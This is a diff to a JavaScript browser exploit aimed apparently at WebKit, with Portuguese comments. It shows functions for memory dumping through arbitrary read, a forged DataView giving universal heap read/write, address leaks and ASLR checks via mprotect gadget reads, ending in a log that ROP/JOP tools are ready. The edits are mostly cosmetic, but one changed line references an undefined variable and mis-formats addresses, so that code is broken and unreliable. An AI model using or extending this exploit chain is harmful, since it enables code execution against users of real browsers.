@@ -50,8 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        // CORREÇÃO DE PONTUAÇÃO/LÓGICA AQUI: Formatação correta do endereço inicial da linha
-        let hexLine = address.add(i).toString(true) + "  "; // Usa toString(true) do AdvancedInt64 para formatar o endereço completo
+        let hexLine = address.add(i + j).toString(16).padStart(2, '0') + " "; // Corrigido aqui
         let asciiLine = "  ";
         let rowBytes = [];
 
@@ -70,7 +69,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
                     break;
                 }
             } else {
-                hexLine += "   "; // Ajustado o espaçamento para consistência
+                hexLine += "   ";
                 asciiLine += " ";
             }
         }
@@ -217,7 +216,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         const read_back_from_fake_dv = await arb_read_universal_js_heap(test_target_js_object_addr, 4, logFn);
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
-            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode: ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
+            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
             // IMPORTANTE: Restaurar o valor original do m_vector do DataView forjado para zero ou um valor seguro.
             // A arb_read/write_universal_js_heap já faz isso, mas uma garantia extra é boa.
             return true;
@@ -329,7 +328,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let found_m_mode = null;
 
     // Declaração da variável fora do try/catch para evitar redeclaração
-    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null;    
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
 
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -459,7 +458,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
                 logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
             } else {
-                logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
+                 logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
             }
             await pauseFn(LOCAL_MEDIUM_PAUSE);
 
@@ -519,7 +518,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
                 logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
             } else {
-                logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+                 logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
             }
 
             logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
